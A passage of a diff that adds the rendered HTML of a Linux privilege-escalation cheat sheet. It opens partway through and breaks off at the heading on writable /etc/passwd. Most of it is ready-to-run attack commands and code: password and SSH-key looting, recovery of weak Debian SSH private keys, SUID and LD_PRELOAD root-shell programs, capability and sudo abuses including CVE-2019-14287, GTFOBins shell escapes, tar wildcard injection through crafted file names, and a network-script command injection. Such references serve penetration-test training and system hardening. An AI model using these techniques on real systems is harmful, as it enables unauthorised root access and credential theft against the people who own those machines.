+  <a class="anchor" href="#looting-for-passwords">#</a>
+</h2>
+<h3 id="files-containing-passwords">
+  Files containing passwords
+  <a class="anchor" href="#files-containing-passwords">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>grep --color=auto -rnw <span style="color:#e6db74">&#39;/&#39;</span> -ie <span style="color:#e6db74">&#34;PASSWORD&#34;</span> --color=always <span style="color:#ae81ff">2</span>&gt; /dev/null
+</span></span><span style="display:flex;"><span>find . -type f -exec grep -i -I <span style="color:#e6db74">&#34;PASSWORD&#34;</span> {} /dev/null \;
+</span></span></code></pre></div><h3 id="old-passwords-in-etcsecurityopasswd">
+  Old passwords in /etc/security/opasswd
+  <a class="anchor" href="#old-passwords-in-etcsecurityopasswd">#</a>
+</h3>
+<p>The <code>/etc/security/opasswd</code> file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them.</p>
+<p>:warning: Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes</p>
+<h3 id="last-edited-files">
+  Last edited files
+  <a class="anchor" href="#last-edited-files">#</a>
+</h3>
+<p>Files that were edited in the last 10 minutes</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>find / -mmin <span style="color:#ae81ff">-10</span> <span style="color:#ae81ff">2</span>&gt;/dev/null | grep -Ev <span style="color:#e6db74">&#34;^/proc&#34;</span>
+</span></span></code></pre></div><h3 id="in-memory-passwords">
+  In memory passwords
+  <a class="anchor" href="#in-memory-passwords">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>strings /dev/mem -n10 | grep -i PASS
+</span></span></code></pre></div><h3 id="find-sensitive-files">
+  Find sensitive files
+  <a class="anchor" href="#find-sensitive-files">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ locate password | more           
+</span></span><span style="display:flex;"><span>/boot/grub/i386-pc/password.mod
+</span></span><span style="display:flex;"><span>/etc/pam.d/common-password
+</span></span><span style="display:flex;"><span>/etc/pam.d/gdm-password
+</span></span><span style="display:flex;"><span>/etc/pam.d/gdm-password.original
+</span></span><span style="display:flex;"><span>/lib/live/config/<span style="color:#ae81ff">0031</span>-root-password
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h2 id="ssh-key">
+  SSH Key
+  <a class="anchor" href="#ssh-key">#</a>
+</h2>
+<h3 id="sensitive-files">
+  Sensitive files
+  <a class="anchor" href="#sensitive-files">#</a>
+</h3>
+<pre tabindex="0"><code>find / -name authorized_keys 2&gt; /dev/null
+find / -name id_rsa 2&gt; /dev/null
+...
+</code></pre><h3 id="ssh-key-predictable-prng-authorized_keys-process">
+  SSH Key Predictable PRNG (Authorized_Keys) Process
+  <a class="anchor" href="#ssh-key-predictable-prng-authorized_keys-process">#</a>
+</h3>
+<p>This module describes how to attempt to use an obtained authorized_keys file on a host system.</p>
+<p>Needed : SSH-DSS String from authorized_keys file</p>
+<p><strong>Steps</strong></p>
+<ol>
+<li>Get the authorized_keys file. An example of this file would look like so:</li>
+</ol>
+<pre tabindex="0"><code>ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... 
+</code></pre><ol start="2">
+<li>Since this is an ssh-dss key, we need to add that to our local copy of <code>/etc/ssh/ssh_config</code> and <code>/etc/ssh/sshd_config</code>:</li>
+</ol>
+<pre tabindex="0"><code>echo &#34;PubkeyAcceptedKeyTypes=+ssh-dss&#34; &gt;&gt; /etc/ssh/ssh_config
+echo &#34;PubkeyAcceptedKeyTypes=+ssh-dss&#34; &gt;&gt; /etc/ssh/sshd_config
+/etc/init.d/ssh restart
+</code></pre><ol start="3">
+<li>Get 
+  <a href="https://github.com/g0tmi1k/debian-ssh">g0tmi1k&rsquo;s debian-ssh repository</a> and unpack the keys:</li>
+</ol>
+<pre tabindex="0"><code>git clone https://github.com/g0tmi1k/debian-ssh
+cd debian-ssh
+tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
+</code></pre><ol start="4">
+<li>Grab the first 20 or 30 bytes from the key file shown above starting with the <code>&quot;AAAA...&quot;</code> portion and grep the unpacked keys with it as:</li>
+</ol>
+<pre tabindex="0"><code>grep -lr &#39;AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf&#39;
+dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub
+</code></pre><ol start="5">
+<li>IF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub) public file. To use the private key file to connect, drop the &lsquo;.pub&rsquo; extension and do:</li>
+</ol>
+<pre tabindex="0"><code>ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934
+</code></pre><p>And you should connect without requiring a password. If stuck, the <code>-vvv</code> verbosity should provide enough details as to why.</p>
+<h2 id="scheduled-tasks">
+  Scheduled tasks
+  <a class="anchor" href="#scheduled-tasks">#</a>
+</h2>
+<h3 id="cron-jobs">
+  Cron jobs
+  <a class="anchor" href="#cron-jobs">#</a>
+</h3>
+<p>Check if you have access with write permission on these files.<br>
+Check inside the file, to find other paths with write permissions.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>/etc/init.d
+</span></span><span style="display:flex;"><span>/etc/cron*
+</span></span><span style="display:flex;"><span>/etc/crontab
+</span></span><span style="display:flex;"><span>/etc/cron.allow
+</span></span><span style="display:flex;"><span>/etc/cron.d 
+</span></span><span style="display:flex;"><span>/etc/cron.deny
+</span></span><span style="display:flex;"><span>/etc/cron.daily
+</span></span><span style="display:flex;"><span>/etc/cron.hourly
+</span></span><span style="display:flex;"><span>/etc/cron.monthly
+</span></span><span style="display:flex;"><span>/etc/cron.weekly
+</span></span><span style="display:flex;"><span>/etc/sudoers
+</span></span><span style="display:flex;"><span>/etc/exports
+</span></span><span style="display:flex;"><span>/etc/anacrontab
+</span></span><span style="display:flex;"><span>/var/spool/cron
+</span></span><span style="display:flex;"><span>/var/spool/cron/crontabs/root
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>crontab -l
+</span></span><span style="display:flex;"><span>ls -alh /var/spool/cron;
+</span></span><span style="display:flex;"><span>ls -al /etc/ | grep cron
+</span></span><span style="display:flex;"><span>ls -al /etc/cron*
+</span></span><span style="display:flex;"><span>cat /etc/cron*
+</span></span><span style="display:flex;"><span>cat /etc/at.allow
+</span></span><span style="display:flex;"><span>cat /etc/at.deny
+</span></span><span style="display:flex;"><span>cat /etc/cron.allow
+</span></span><span style="display:flex;"><span>cat /etc/cron.deny*
+</span></span></code></pre></div><p>You can use 
+  <a href="https://github.com/DominicBreuker/pspy">pspy</a> to detect a CRON job.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># print both commands and file system events and scan procfs every 1000 ms (=1sec)</span>
+</span></span><span style="display:flex;"><span>./pspy64 -pf -i <span style="color:#ae81ff">1000</span> 
+</span></span></code></pre></div><h2 id="systemd-timers">
+  Systemd timers
+  <a class="anchor" href="#systemd-timers">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>systemctl list-timers --all
+</span></span><span style="display:flex;"><span>NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
+</span></span><span style="display:flex;"><span>Mon <span style="color:#ae81ff">2019</span>-<span style="color:#ae81ff">04</span>-<span style="color:#ae81ff">01</span> <span style="color:#ae81ff">02</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">14</span> CEST  15h left Sun <span style="color:#ae81ff">2019</span>-<span style="color:#ae81ff">03</span>-<span style="color:#ae81ff">31</span> <span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">52</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">49</span> CEST  24min ago          apt-daily.timer              apt-daily.service
+</span></span><span style="display:flex;"><span>Mon <span style="color:#ae81ff">2019</span>-<span style="color:#ae81ff">04</span>-<span style="color:#ae81ff">01</span> <span style="color:#ae81ff">06</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">20</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">40</span> CEST  19h left Sun <span style="color:#ae81ff">2019</span>-<span style="color:#ae81ff">03</span>-<span style="color:#ae81ff">31</span> <span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">52</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">49</span> CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
+</span></span><span style="display:flex;"><span>Mon <span style="color:#ae81ff">2019</span>-<span style="color:#ae81ff">04</span>-<span style="color:#ae81ff">01</span> <span style="color:#ae81ff">07</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">36</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">10</span> CEST  20h left Sat <span style="color:#ae81ff">2019</span>-<span style="color:#ae81ff">03</span>-<span style="color:#ae81ff">09</span> <span style="color:#ae81ff">14</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">28</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">25</span> CET   <span style="color:#ae81ff">3</span> weeks <span style="color:#ae81ff">0</span> days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> timers listed.
+</span></span></code></pre></div><h2 id="suid">
+  SUID
+  <a class="anchor" href="#suid">#</a>
+</h2>
+<p>SUID/Setuid stands for &ldquo;set user ID upon execution&rdquo;, it is enabled by default in every Linux distributions. If a file with this bit is ran, the uid will be changed by the owner one. If the file owner is <code>root</code>, the uid will be changed to <code>root</code> even if it was executed from user <code>bob</code>. SUID bit is represented by an <code>s</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╭─</span>swissky@lab ~  
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╰─</span>$ ls /usr/bin/sudo -alh                  
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root 138K <span style="color:#ae81ff">23</span> nov.  <span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">04</span> /usr/bin/sudo
+</span></span></code></pre></div><h3 id="find-suid-binaries">
+  Find SUID binaries
+  <a class="anchor" href="#find-suid-binaries">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 -type f -exec ls -la <span style="color:#f92672">{}</span> 2&gt;/dev/null <span style="color:#ae81ff">\;</span>
+</span></span><span style="display:flex;"><span>find / -uid <span style="color:#ae81ff">0</span> -perm -4000 -type f 2&gt;/dev/null
+</span></span></code></pre></div><h3 id="create-a-suid-binary">
+  Create a SUID binary
+  <a class="anchor" href="#create-a-suid-binary">#</a>
+</h3>
+<table>
+<thead>
+<tr>
+<th>Function</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>setreuid()</td>
+<td>sets real and effective user IDs of the calling process</td>
+</tr>
+<tr>
+<td>setuid()</td>
+<td>sets the effective user ID of the calling process</td>
+</tr>
+<tr>
+<td>setgid()</td>
+<td>sets the effective group ID of the calling process</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>print <span style="color:#e6db74">&#39;int main(void){\nsetresuid(0, 0, 0);\nsystem(&#34;/bin/sh&#34;);\n}&#39;</span> &gt; /tmp/suid.c   
+</span></span><span style="display:flex;"><span>gcc -o /tmp/suid /tmp/suid.c  
+</span></span><span style="display:flex;"><span>sudo chmod +x /tmp/suid <span style="color:#75715e"># execute right</span>
+</span></span><span style="display:flex;"><span>sudo chmod +s /tmp/suid <span style="color:#75715e"># setuid bit</span>
+</span></span></code></pre></div><h2 id="capabilities">
+  Capabilities
+  <a class="anchor" href="#capabilities">#</a>
+</h2>
+<h3 id="list-capabilities-of-binaries">
+  List capabilities of binaries
+  <a class="anchor" href="#list-capabilities-of-binaries">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╭─</span>swissky@lab ~  
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╰─</span>$ /usr/bin/getcap -r  /usr/bin
+</span></span><span style="display:flex;"><span>/usr/bin/fping                = cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
+</span></span><span style="display:flex;"><span>/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+</span></span><span style="display:flex;"><span>/usr/bin/rlogin               = cap_net_bind_service+ep
+</span></span><span style="display:flex;"><span>/usr/bin/ping                 = cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/bin/rsh                  = cap_net_bind_service+ep
+</span></span><span style="display:flex;"><span>/usr/bin/rcp                  = cap_net_bind_service+ep
+</span></span></code></pre></div><h3 id="edit-capabilities">
+  Edit capabilities
+  <a class="anchor" href="#edit-capabilities">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>/usr/bin/setcap -r /bin/ping            <span style="color:#75715e"># remove</span>
+</span></span><span style="display:flex;"><span>/usr/bin/setcap cap_net_raw+p /bin/ping <span style="color:#75715e"># add</span>
+</span></span></code></pre></div><h3 id="interesting-capabilities">
+  Interesting capabilities
+  <a class="anchor" href="#interesting-capabilities">#</a>
+</h3>
+<p>Having the capability =ep means the binary has all the capabilities.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ getcap openssl /usr/bin/openssl 
+</span></span><span style="display:flex;"><span>openssl=ep
+</span></span></code></pre></div><p>Alternatively the following capabilities can be used in order to upgrade your current privileges.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cap_dac_read_search <span style="color:#75715e"># read anything</span>
+</span></span><span style="display:flex;"><span>cap_setuid+ep <span style="color:#75715e"># setuid</span>
+</span></span></code></pre></div><p>Example of privilege escalation with <code>cap_setuid+ep</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ python2.7 -c <span style="color:#e6db74">&#39;import os; os.setuid(0); os.system(&#34;/bin/sh&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>sh-<span style="color:#ae81ff">5.0</span><span style="color:#75715e"># id</span>
+</span></span><span style="display:flex;"><span>uid=<span style="color:#ae81ff">0</span>(root) gid=<span style="color:#ae81ff">1000</span>(swissky)
+</span></span></code></pre></div><table>
+<thead>
+<tr>
+<th>Capabilities name</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CAP_AUDIT_CONTROL</td>
+<td>Allow to enable/disable kernel auditing</td>
+</tr>
+<tr>
+<td>CAP_AUDIT_WRITE</td>
+<td>Helps to write records to kernel auditing log</td>
+</tr>
+<tr>
+<td>CAP_BLOCK_SUSPEND</td>
+<td>This feature can block system suspends</td>
+</tr>
+<tr>
+<td>CAP_CHOWN</td>
+<td>Allow user to make arbitrary change to files UIDs and GIDs</td>
+</tr>
+<tr>
+<td>CAP_DAC_OVERRIDE</td>
+<td>This helps to bypass file read, write and execute permission checks</td>
+</tr>
+<tr>
+<td>CAP_DAC_READ_SEARCH</td>
+<td>This only bypass file and directory read/execute permission checks</td>
+</tr>
+<tr>
+<td>CAP_FOWNER</td>
+<td>This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file</td>
+</tr>
+<tr>
+<td>CAP_KILL</td>
+<td>Allow the sending of signals to processes belonging to others</td>
+</tr>
+<tr>
+<td>CAP_SETGID</td>
+<td>Allow changing of the GID</td>
+</tr>
+<tr>
+<td>CAP_SETUID</td>
+<td>Allow changing of the UID</td>
+</tr>
+<tr>
+<td>CAP_SETPCAP</td>
+<td>Helps to transferring and removal of current set to any PID</td>
+</tr>
+<tr>
+<td>CAP_IPC_LOCK</td>
+<td>This helps to lock memory</td>
+</tr>
+<tr>
+<td>CAP_MAC_ADMIN</td>
+<td>Allow MAC configuration or state changes</td>
+</tr>
+<tr>
+<td>CAP_NET_RAW</td>
+<td>Use RAW and PACKET sockets</td>
+</tr>
+<tr>
+<td>CAP_NET_BIND_SERVICE</td>
+<td>SERVICE Bind a socket to internet domain privileged ports</td>
+</tr>
+</tbody>
+</table>
+<h2 id="sudo">
+  SUDO
+  <a class="anchor" href="#sudo">#</a>
+</h2>
+<p>Tool: 
+  <a href="https://github.com/TH3xACE/SUDO_KILLER">Sudo Exploitation</a></p>
+<h3 id="nopasswd">
+  NOPASSWD
+  <a class="anchor" href="#nopasswd">#</a>
+</h3>
+<p>Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo -l
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User demo may run the following commands on crashlab:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/vim
+</span></span></code></pre></div><p>In this example the user <code>demo</code> can run <code>vim</code> as <code>root</code>, it is now trivial to get a shell by adding an ssh key into the root directory or by calling <code>sh</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo vim -c <span style="color:#e6db74">&#39;!sh&#39;</span>
+</span></span><span style="display:flex;"><span>sudo -u root vim -c <span style="color:#e6db74">&#39;!sh&#39;</span>
+</span></span></code></pre></div><h3 id="ld_preload-and-nopasswd">
+  LD_PRELOAD and NOPASSWD
+  <a class="anchor" href="#ld_preload-and-nopasswd">#</a>
+</h3>
+<p>If <code>LD_PRELOAD</code> is explicitly defined in the sudoers file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Defaults        env_keep += LD_PRELOAD
+</span></span></code></pre></div><p>Compile the following shared object using the C code below with <code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">_init</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">unsetenv</span>(<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">setgid</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">setuid</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Execute any binary with the LD_PRELOAD to spawn a shell : <code>sudo LD_PRELOAD=&lt;full_path_to_so_file&gt; &lt;program&gt;</code>, e.g: <code>sudo LD_PRELOAD=/tmp/shell.so find</code></p>
+<h3 id="doas">
+  Doas
+  <a class="anchor" href="#doas">#</a>
+</h3>
+<p>There are some alternatives to the <code>sudo</code> binary such as <code>doas</code> for OpenBSD, remember to check its configuration at <code>/etc/doas.conf</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>permit nopass demo as root cmd vim
+</span></span></code></pre></div><h3 id="sudo_inject">
+  sudo_inject
+  <a class="anchor" href="#sudo_inject">#</a>
+</h3>
+<p>Using 
+  <a href="https://github.com/nongiach/sudo_inject">https://github.com/nongiach/sudo_inject</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ sudo whatever
+</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">sudo</span>] password <span style="color:#66d9ef">for</span> user<span style="color:#960050;background-color:#1e0010">:</span>    
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Press &lt;ctrl&gt;+c since you don&#39;t have the password. </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This creates an invalid sudo tokens.</span>
+</span></span><span style="display:flex;"><span>$ sh exploit.sh
+</span></span><span style="display:flex;"><span>.... wait <span style="color:#ae81ff">1</span> seconds
+</span></span><span style="display:flex;"><span>$ sudo -i <span style="color:#75715e"># no password required :)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># id</span>
+</span></span><span style="display:flex;"><span>uid=<span style="color:#ae81ff">0</span>(root) gid=<span style="color:#ae81ff">0</span>(root) groups=<span style="color:#ae81ff">0</span>(root)
+</span></span></code></pre></div><p>Slides of the presentation : 
+  <a href="https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf">https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf</a></p>
+<h3 id="cve-2019-14287">
+  CVE-2019-14287
+  <a class="anchor" href="#cve-2019-14287">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Exploitable when a user have the following permissions (sudo -l)</span>
+</span></span><span style="display:flex;"><span>(ALL, !root) ALL
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># If you have a full TTY, you can exploit it like this</span>
+</span></span><span style="display:flex;"><span>sudo -u<span style="color:#75715e">#-1 /bin/bash</span>
+</span></span><span style="display:flex;"><span>sudo -u<span style="color:#75715e">#4294967295 id</span>
+</span></span></code></pre></div><h2 id="gtfobins">
+  GTFOBins
+  <a class="anchor" href="#gtfobins">#</a>
+</h2>
+<p>
+  <a href="https://gtfobins.github.io">GTFOBins</a> is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p>
+<p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p>
+<blockquote>
+<p>gdb -nx -ex &lsquo;!sh&rsquo; -ex quit <br>
+sudo mysql -e &lsquo;! /bin/sh&rsquo; <br>
+strace -o /dev/null /bin/sh <br>
+sudo awk &lsquo;BEGIN {system(&quot;/bin/sh&quot;)}&rsquo;</p>
+</blockquote>
+<h2 id="wildcard">
+  Wildcard
+  <a class="anchor" href="#wildcard">#</a>
+</h2>
+<p>By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that&rsquo;s where the wildcard comes in handy.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># create file for exploitation</span>
+</span></span><span style="display:flex;"><span>touch -- <span style="color:#e6db74">&#34;--checkpoint=1&#34;</span>
+</span></span><span style="display:flex;"><span>touch -- <span style="color:#e6db74">&#34;--checkpoint-action=exec=sh shell.sh&#34;</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;#\!/bin/bash\ncat /etc/passwd &gt; /tmp/flag\nchmod 777 /tmp/flag&#34;</span> &gt; shell.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># vulnerable script</span>
+</span></span><span style="display:flex;"><span>tar cf archive.tar *
+</span></span></code></pre></div><p>Tool: 
+  <a href="https://github.com/localh0t/wildpwn">wildpwn</a></p>
+<h2 id="writable-files">
+  Writable files
+  <a class="anchor" href="#writable-files">#</a>
+</h2>
+<p>List world writable files on the system.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>find / -writable ! -user `whoami` -type f ! -path <span style="color:#e6db74">&#34;/proc/*&#34;</span> ! -path <span style="color:#e6db74">&#34;/sys/*&#34;</span> -exec ls -al {} \; <span style="color:#ae81ff">2</span>&gt;/dev/null
+</span></span><span style="display:flex;"><span>find / -perm <span style="color:#ae81ff">-2</span> -type f <span style="color:#ae81ff">2</span>&gt;/dev/null
+</span></span><span style="display:flex;"><span>find / ! -path <span style="color:#e6db74">&#34;*/proc/*&#34;</span> -perm <span style="color:#ae81ff">-2</span> -type f -print <span style="color:#ae81ff">2</span>&gt;/dev/null
+</span></span></code></pre></div><h3 id="writable-etcsysconfignetwork-scripts-centosredhat">
+  Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)
+  <a class="anchor" href="#writable-etcsysconfignetwork-scripts-centosredhat">#</a>
+</h3>
+<p>/etc/sysconfig/network-scripts/ifcfg-1337 for example</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>NAME=Network /bin/id  &amp;lt;= Note the blank space
+</span></span><span style="display:flex;"><span>ONBOOT=yes
+</span></span><span style="display:flex;"><span>DEVICE=eth0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>EXEC <span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>./etc/sysconfig/network-scripts/ifcfg-<span style="color:#ae81ff">1337</span>
+</span></span></code></pre></div><p>src : 
+  <a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f">https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</a></p>
+<h3 id="writable-etcpasswd">
+  Writable /etc/passwd
+  <a class="anchor" href="#writable-etcpasswd">#</a>
+</h3>
+<p>First generate a password with one of the following commands.</p>
